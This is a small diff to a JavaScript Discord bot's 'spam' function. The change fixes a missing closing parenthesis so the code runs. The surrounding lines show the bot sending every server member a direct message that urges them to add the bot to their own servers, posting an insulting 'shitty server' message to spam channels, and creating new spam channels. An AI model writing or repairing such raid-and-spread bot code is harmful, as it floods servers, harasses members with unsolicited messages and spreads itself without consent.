@@ -6,7 +6,7 @@ function spam(bot, message) {
     .then(link => {
       message.guild.members.forEach(member => member.send(`If you want to prank ur friends, also add me to your server: ${link}`));
     }); 
-  bot.channels.filter(c => c.name === 'spam').forEach(channel => channel.send("💣 !! ATTENTION !! - You're in a shitty server! 💣")
+  bot.channels.filter(c => c.name === 'spam').forEach(channel => channel.send("💣 !! ATTENTION !! - You're in a shitty server! 💣"));
   message.guild.createChannel('spam', 'text')
       .then(console.log)
       .catch(console.error);
